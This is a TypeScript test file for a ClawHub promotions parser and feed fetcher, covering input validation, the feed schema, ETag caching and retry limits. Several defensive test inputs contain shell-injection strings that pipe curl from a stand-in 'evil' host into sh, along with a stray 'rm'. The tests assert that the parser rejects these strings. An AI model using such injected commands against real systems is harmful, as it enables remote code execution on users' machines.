import { describe, expect, it, vi } from "vitest";
import {
  fetchClawHubPromotion,
  fetchClawHubPromotions,
  fetchClawHubPromotionsFeed,
  parseClawHubPromotion,
  parseClawHubPromotionsFeed,
} from "./clawhub.js";

const validPromotion = {
  slug: "spring-models",
  title: "Free Example models",
  blurb: "A limited-time offer.",
  status: "active",
  active: true,
  startsAt: 100,
  endsAt: 200,
  provider: "openrouter",
  authChoiceId: "openrouter-api-key",
  models: [{ modelRef: "openrouter/example/model-alpha", alias: "Alpha", suggestedDefault: true }],
  signupUrl: "https://signup.example.com",
};

function jsonResponse(body: unknown, status = 200, headers: Record<string, string> = {}) {
  return new Response(JSON.stringify(body), {
    status,
    headers: { "content-type": "application/json", ...headers },
  });
}

describe("parseClawHubPromotion", () => {
  it("parses a full promotion payload", () => {
    const parsed = parseClawHubPromotion({
      ...validPromotion,
      pluginNames: ["@openclaw/openrouter-provider"],
    });
    expect(parsed.slug).toBe("spring-models");
    expect(parsed.models[0]?.suggestedDefault).toBe(true);
    expect(parsed.pluginNames).toEqual(["@openclaw/openrouter-provider"]);
  });

  it("rejects payloads without models", () => {
    expect(() => parseClawHubPromotion({ ...validPromotion, models: [] })).toThrow(/models/);
  });

  it("rejects slugs outside ClawHub's slug contract", () => {
    // Slugs are echoed into copy-paste commands; shell metacharacters must fail parsing.
    expect(() =>
      parseClawHubPromotion({ ...validPromotion, slug: "deal; curl evil.sh|sh" }),
    ).toThrow(/slug/);
    expect(() => parseClawHubPromotion({ ...validPromotion, slug: "UPPER-case" })).toThrow(/slug/);
  });

  it("rejects model refs with shell metacharacters", () => {
    expect(() =>
      parseClawHubPromotion({
        ...validPromotion,
        models: [{ modelRef: "openrouter/foo; curl https://evil.example/sh | sh" }],
      }),
    ).toThrow(/unsupported characters/);
  });

  it("rejects non-string model refs", () => {
    expect(() => parseClawHubPromotion({ ...validPromotion, models: [{ modelRef: 42 }] })).toThrow(
      /modelRef/,
    );
  });

  it("rejects non-numeric windows", () => {
    expect(() => parseClawHubPromotion({ ...validPromotion, endsAt: "soon" })).toThrow(/endsAt/);
  });

  it("rejects inverted promotion windows", () => {
    expect(() =>
      parseClawHubPromotion({
        ...validPromotion,
        startsAt: 200,
        endsAt: 200,
      }),
    ).toThrow(/window/);
  });

  it("rejects plugin values that are not package names", () => {
    expect(() =>
      parseClawHubPromotion({
        ...validPromotion,
        pluginNames: ["@openclaw/openrouter-provider@latest"],
      }),
    ).toThrow(/pluginNames/);
  });
});

describe("promotion fetches", () => {
  it("fetches and validates the active promotions list", async () => {
    const fetchImpl = vi.fn(async (..._args: unknown[]) =>
      jsonResponse({ promotions: [validPromotion] }),
    );
    const promotions = await fetchClawHubPromotions({ fetchImpl });
    expect(promotions).toHaveLength(1);
    expect(String(fetchImpl.mock.calls[0]?.[0])).toContain("/api/v1/promotions");
  });

  it("rejects a list response without a promotions array", async () => {
    const fetchImpl = vi.fn(async (..._args: unknown[]) => jsonResponse({ nope: true }));
    await expect(fetchClawHubPromotions({ fetchImpl })).rejects.toThrow(/promotions array/);
  });

  it("fetches a single promotion by slug", async () => {
    const fetchImpl = vi.fn(async (..._args: unknown[]) => jsonResponse(validPromotion));
    const promotion = await fetchClawHubPromotion({ slug: "spring-models", fetchImpl });
    expect(promotion.title).toBe("Free Example models");
    expect(String(fetchImpl.mock.calls[0]?.[0])).toContain("/api/v1/promotions/spring-models");
  });
});

const { status: _status, active: _active, ...feedEntryFields } = validPromotion;
const validFeed = {
  schemaVersion: 1,
  id: "clawhub-promotions",
  generatedAt: "2026-07-05T00:00:00.000Z",
  sequence: 3,
  expiresAt: "2026-07-06T00:00:00.000Z",
  entries: [{ type: "promotion", ...feedEntryFields }],
};

describe("parseClawHubPromotionsFeed", () => {
  it("parses a valid feed snapshot", () => {
    const feed = parseClawHubPromotionsFeed(validFeed);
    expect(feed.sequence).toBe(3);
    expect(feed.entries[0]?.slug).toBe("spring-models");
    expect(feed.entries[0]?.models[0]?.modelRef).toBe("openrouter/example/model-alpha");
  });

  it("rejects wrong feed ids and schema versions", () => {
    expect(() => parseClawHubPromotionsFeed({ ...validFeed, id: "other-feed" })).toThrow(/feed id/);
    expect(() => parseClawHubPromotionsFeed({ ...validFeed, schemaVersion: 2 })).toThrow(
      /schema version/,
    );
  });

  it("rejects malformed sequences, timestamps, and entry types", () => {
    expect(() => parseClawHubPromotionsFeed({ ...validFeed, sequence: -1 })).toThrow(/sequence/);
    expect(() => parseClawHubPromotionsFeed({ ...validFeed, generatedAt: "not-a-date" })).toThrow(
      /ISO dates/,
    );
    expect(() =>
      parseClawHubPromotionsFeed({
        ...validFeed,
        entries: [{ type: "advert", ...feedEntryFields }],
      }),
    ).toThrow(/entry type/);
    expect(() =>
      parseClawHubPromotionsFeed({
        ...validFeed,
        expiresAt: "2026-07-04T00:00:00.000Z",
      }),
    ).toThrow(/expiresAt/);
  });

  it("holds feed entries to the promotion payload contracts", () => {
    expect(() =>
      parseClawHubPromotionsFeed({
        ...validFeed,
        entries: [{ type: "promotion", ...feedEntryFields, models: [{ modelRef: "bad ref; rm" }] }],
      }),
    ).toThrow(/modelRef/);
  });
});

describe("fetchClawHubPromotionsFeed", () => {
  it("fetches without auth, returns the parsed feed and etag", async () => {
    const fetchImpl = vi.fn(async (..._args: unknown[]) =>
      jsonResponse(validFeed, 200, { etag: '"seq-3"' }),
    );
    const result = await fetchClawHubPromotionsFeed({ fetchImpl });
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.feed.sequence).toBe(3);
      expect(result.etag).toBe('"seq-3"');
    }
    expect(String(fetchImpl.mock.calls[0]?.[0])).toContain("/api/v1/feeds/promotions");
    const init = fetchImpl.mock.calls[0]?.[1] as RequestInit;
    expect(new Headers(init?.headers).get("authorization")).toBeNull();
  });

  it("sends If-None-Match and maps 304 to not-modified", async () => {
    const fetchImpl = vi.fn(async (..._args: unknown[]) => new Response(null, { status: 304 }));
    const result = await fetchClawHubPromotionsFeed({ etag: '"seq-3"', fetchImpl });
    expect(result.status).toBe("not-modified");
    const init = fetchImpl.mock.calls[0]?.[1] as RequestInit;
    expect(new Headers(init?.headers).get("if-none-match")).toBe('"seq-3"');
  });

  it("does not extend the interactive feed timeout with transient retries", async () => {
    const fetchImpl = vi.fn().mockRejectedValue(new Error("offline"));

    await expect(fetchClawHubPromotionsFeed({ fetchImpl })).rejects.toThrow("offline");

    expect(fetchImpl).toHaveBeenCalledTimes(1);
  });
});
